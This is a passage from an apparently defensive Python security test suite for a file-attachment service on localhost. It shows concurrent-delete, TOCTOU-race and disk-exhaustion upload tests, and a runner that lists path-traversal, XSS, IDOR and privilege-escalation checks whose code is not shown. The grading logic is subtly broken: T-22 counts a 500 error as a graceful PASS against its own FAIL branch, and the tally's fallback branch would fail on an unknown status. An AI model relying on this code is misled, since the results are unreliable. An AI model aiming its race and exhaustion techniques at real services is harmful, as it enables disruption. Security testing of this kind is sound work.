        攻击方式: 多线程同时发送DELETE请求给同一文件ID
        预期: 幂等处理,第一次删除后后续返回"不存在"
        """
        try:
            # 先上传一个文件
            files = {'file': ('concurrent_del.txt', b'delete me', 'text/plain')}
            upload_resp = self.session.post(UPLOAD_URL, files=files,
                                          data={'businessType': 'general'})
            if upload_resp.status_code != 200:
                log_result("T-21", "并发删除同一文件", "ERROR",
                         f"上传失败: {upload_resp.status_code}")
                return

            file_id = upload_resp.json()['data']['attachmentId']

            def delete_once():
                r = self.session.delete(DELETE_URL_TEMPLATE.format(file_id))
                return r.status_code

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(delete_once) for _ in range(10)]
                results = [f.result(timeout=10) for f in as_completed(futures)]

            success_200 = sum(1 for s in results if s == 200)
            not_found = sum(1 for s in results if s == 404)
            errors = sum(1 for s in results if s in [500, 502, 503])

            if errors > 0:
                log_result("T-21", "并发删除同一文件", "FAIL",
                         f"并发删除导致服务器错误! 5xx: {errors}/10")
            elif success_200 <= 1 and not_found >= 9:
                log_result("T-21", "并发删除同一文件", "PASS",
                         f"幂等处理良好: 成功:{success_200}, 404:{not_found}")
            else:
                log_result("T-21", "并发删除同一文件", "PARTIAL",
                         f"结果分布: 200={success_200}, 404={not_found}, 其他={10-success_200-not_found}")

        except Exception as e:
            log_result("T-21", "并发删除同一文件", "ERROR", str(e))

    # ==================== T-22: 下载时文件被删除(TOCTOU) ====================
    def test_t22_toctou_download(self):
        """
        T-22: 下载时文件被删除(TOCTOU竞争条件)
        场景: check时间到use时间之间文件被删除
        预期: 应优雅处理,不应崩溃
        """
        try:
            # 上传一个小文件
            files = {'file': ('toctou_test.txt', b'toctou content', 'text/plain')}
            upload_resp = self.session.post(UPLOAD_URL, files=files,
                                          data={'businessType': 'general'})
            if upload_resp.status_code != 200:
                log_result("T-22", "TOCTOU下载竞争", "ERROR",
                         f"上传失败: {upload_resp.status_code}")
                return

            file_id = upload_resp.json()['data']['attachmentId']

            # 在另一个线程中快速删除
            def quick_delete():
                time.sleep(0.01)  # 极短延迟
                self.session.delete(DELETE_URL_TEMPLATE.format(file_id))

            t = threading.Thread(target=quick_delete)
            t.start()

            # 立即尝试下载
            download_resp = self.session.get(DOWNLOAD_URL_TEMPLATE.format(file_id))
            t.join(timeout=5)

            if download_resp.status_code in [200, 404, 500]:
                log_result("T-22", "TOCTOU下载竞争", "PASS",
                         f"优雅处理TOCTOU: 返回{download_resp.status_code}, 无崩溃")
            elif download_resp.status_code >= 500:
                log_result("T-22", "TOCTOU下载竞争", "FAIL",
                         f"TOCTOU导致服务器错误: {download_resp.status_code}")
            else:
                log_result("T-22", "TOCTOU下载竞争", "PARTIAL",
                         f"状态码: {download_resp.status_code}")

        except Exception as e:
            log_result("T-22", "TOCTOU下载竞争", "ERROR", str(e))

    # ==================== T-23: 磁盘空间不足 ====================
    def test_t23_disk_space_exhaustion(self):
        """
        T-23: 磁盘空间不足时的行为
        攻击方式: 快速连续上传直到磁盘接近满
        注意: 此测试仅观察错误处理,不会真正填满磁盘
        """
        try:
            # 上传几个中等大小的文件观察行为
            errors = []
            for i in range(3):
                data = b'X' * (10 * 1024 * 1024)  # 10MB each
                files = {'file': (f'disk_test_{i}.bin', data, 'application/octet-stream')}
                resp = self.session.post(UPLOAD_URL, files=files,
                                        data={'businessType': 'general'}, timeout=30)
                if resp.status_code != 200:
                    errors.append((i, resp.status_code, resp.text[:100]))

            if len(errors) == 0:
                log_result("T-23", "磁盘空间不足处理", "PASS",
                         "正常情况下上传成功(3个10MB文件)")
                # 清理
                # (实际应清理,此处简化)
            elif any(code == 500 for _, code, _ in errors):
                log_result("T-23", "磁盘空间不足处理", "PARTIAL",
                         f"出现500错误(可能是磁盘空间或其他原因): {errors}")
            else:
                log_result("T-23", "磁盘空间不足处理", "PASS",
                         f"错误被适当处理: {errors}")

        except requests.exceptions.RequestException as e:
            if "disk" in str(e).lower() or "space" in str(e).lower():
                log_result("T-23", "磁盘空间不足处理", "PASS",
                         f"磁盘相关错误被捕获: {str(e)[:100]}")
            else:
                log_result("T-23", "磁盘空间不足处理", "ERROR", str(e)[:100])
        except Exception as e:
            log_result("T-23", "磁盘空间不足处理", "ERROR", str(e))


def main():
    print("=" * 70)
    print("文件/附件管理模块 - 对抗性安全测试套件")
    print("File Attachment Module - Adversarial Security Test Suite")
    print("=" * 70)
    print()

    # 检查命令行参数
    token = None
    for i, arg in enumerate(sys.argv):
        if arg == '--token' and i + 1 < len(sys.argv):
            token = sys.argv[i + 1]

    if not token:
        print("[!] 用法: python file_attachment_adversarial_test.py --token <JWT_TOKEN>")
        print("[!] 或者设置环境变量: export JWT_TOKEN=<your_token>")
        token = os.environ.get('JWT_TOKEN')

    if not token:
        print("[ERROR] 未提供JWT Token! 无法进行需认证的测试。")
        print("[INFO] 将跳过需认证的测试...")
        print()

    # 连接测试
    print("[*] 测试服务器连接...")
    try:
        health_resp = requests.get(f"{BASE_URL}/actuator/health", timeout=5)
        if health_resp.status_code == 200:
            print("[+] 服务器连接正常")
        else:
            print(f"[-] 服务器返回: {health_resp.status_code}")
    except Exception as e:
        print(f"[!] 无法连接服务器: {e}")
        print("[!] 请确保后端服务已在 http://localhost:8081 启动")
        print("=" * 70)
        sys.exit(1)

    print()

    # 执行测试
    tester = AdversarialTester(token) if token else None

    test_groups = [
        ("路径遍历攻击 (T-01~T-03)", [
            ("T-01", tester.test_t01_linux_path_traversal if tester else None),
            ("T-02", tester.test_t02_windows_path_traversal if tester else None),
            ("T-03", tester.test_t03_null_byte_injection if tester else None),
        ]),
        ("文件类型欺骗 (T-04~T-07)", [
            ("T-04", tester.test_t04_mime_type_spoofing if tester else None),
            ("T-05", tester.test_t05_executable_disguise if tester else None),
            ("T-06", tester.test_t06_html_xss_via_image_upload if tester else None),
            ("T-07", tester.test_t07_svg_xss if tester else None),
        ]),
        ("大小/资源耗尽 (T-08~T-11)", [
            ("T-08", tester.test_t08_zero_byte_file if tester else None),
            ("T-09", tester.test_t09_oversized_file if tester else None),
            ("T-10", tester.test_t10_long_filename if tester else None),
            ("T-11", tester.test_t11_no_extension if tester else None),
        ]),
        ("权限与访问控制 (T-12~T-15)", [
            ("T-12", tester.test_t12_unauthenticated_upload),
            ("T-13", tester.test_t13_unauthenticated_download),
            ("T-14", tester.test_t14_idor_download if tester else None),
            ("T-15", tester.test_t15_privilege_escalation if tester else None),
        ]),
        ("分片上传安全 (T-16~T-19)", [
            ("T-16", tester.test_t16_chunk_number_tampering if tester else None),
            ("T-17", tester.test_t17_fake_upload_id if tester else None),
            ("T-18", tester.test_t18_chunk_race_condition if tester else None),
            ("T-19", tester.test_t19_merge_incomplete_chunks if tester else None),
        ]),
        ("并发与可靠性 (T-20~T-23)", [
            ("T-20", tester.test_t20_concurrent_md5 if tester else None),
            ("T-21", tester.test_t21_concurrent_delete if tester else None),
            ("T-22", tester.test_t22_toctou_download if tester else None),
            ("T-23", tester.test_t23_disk_space_exhaustion if tester else None),
        ]),
    ]

    for group_name, tests in test_groups:
        print(f"\n{'─' * 60}")
        print(f"  {group_name}")
        print(f"{'─' * 60}")
        for test_id, test_func in tests:
            if test_func:
                try:
                    test_func()
                except Exception as e:
                    log_result(test_id, test_id, "ERROR", f"测试异常: {str(e)[:100]}")
            else:
                log_result(test_id, test_id, "SKIP", "无Token,跳过需认证测试")

    # 清理
    if tester:
        tester.cleanup()

    # 统计结果
    print("\n")
    print("=" * 70)
    print("                          测试结果汇总")
    print("=" * 70)

    categories = {
        "PASS": 0,
        "FAIL": 0,
        "PARTIAL": 0,
        "ERROR": 0,
        "SKIP": 0,
        "HIGH_RISK": 0,
        "CRITICAL_FAIL": 0,
        "WARN": 0
    }

    for tid, result in sorted(test_results.items()):
        status = result["status"]
        if status in categories:
            categories[status] += 1
        else:
            categories[status] += 1

    total_tests = len(test_results)
    pass_count = categories["PASS"]
    fail_count = categories["FAIL"] + categories["CRITICAL_FAIL"] + categories["HIGH_RISK"]
    partial_count = categories["PARTIAL"] + categories["WARN"]

    print(f"\n  总测试数: {total_tests}")
    print(f"  ├─ PASS:      {categories['PASS']:3d}  ({categories['PASS']/total_tests*100:.1f}%)")
    print(f"  ├─ FAIL:      {fail_count:3d}  ({fail_count/total_tests*100:.1f}%)")
    print(f"  │   └─ CRITICAL: {categories['CRITICAL_FAIL']}")
    print(f"  │   └─ HIGH_RISK: {categories['HIGH_RISK']}")
    print(f"  │   └─ FAIL:      {categories['FAIL']}")
    print(f"  ├─ PARTIAL:   {partial_count:3d}  ({partial_count/total_tests*100:.1f}%)")
    print(f"  ├─ ERROR:     {categories['ERROR']:3d}  ({categories['ERROR']/total_tests*100:.1f}%)")
    print(f"  └─ SKIP:      {categories['SKIP']:3d}  ({categories['SKIP']/total_tests*100:.1f}%)")

    pass_rate = (pass_count / total_tests * 100) if total_tests > 0 else 0

    print(f"\n  通过率: {pass_rate:.1f}%")

    # 最终判定
    print("\n" + "=" * 70)
    if categories["CRITICAL_FAIL"] > 0:
        print("  *** VERDICT: FAIL (存在关键安全漏洞) ***")
        print("  发现关键(CRITICAL)级别漏洞,必须立即修复!")
    elif fail_count > 3:
        print("  *** VERDICT: FAIL (<85%, 存在多个安全问题) ***")
        print(f"  失败测试过多: {fail_count}/{total_tests}")
    elif pass_rate >= 95:
        print("  *** VERDICT: PASS (>=95%) ***")
        print("  安全性基本达标,建议修复PARTIAL项")
    elif pass_rate >= 85:
        print("  *** VERDICT: CONDITIONAL PASS (85-94%) ***")
        print("  存在一些需要注意的问题,建议在生产环境前修复")
    else:
        print(f"  *** VERDICT: FAIL (<{pass_rate:.0f}%) ***")
        print("  安全性不达标,需要重点修复")

    # 详细失败列表
    failures = [(tid, res) for tid, res in test_results.items()
                if res["status"] in ["FAIL", "CRITICAL_FAIL", "HIGH_RISK"]]
    if failures:
        print("\n  ⚠ 失败/高风险测试详情:")
        for tid, res in failures:
            print(f"    • {tid}: {res['name']}")
            print(f"      状态: {res['status']}")
            print(f"      详情: {res['details']}")

    print("\n" + "=" * 70)
    print("测试完成。请查看上方详细结果。")
    print("=" * 70)

    # 返回退出码
    if categories["CRITICAL_FAIL"] > 0 or fail_count > 3:
        sys.exit(2)
    elif pass_rate < 85:
        sys.exit(1)
    else:
        sys.exit(0)


if __name__ == "__main__":
    main()
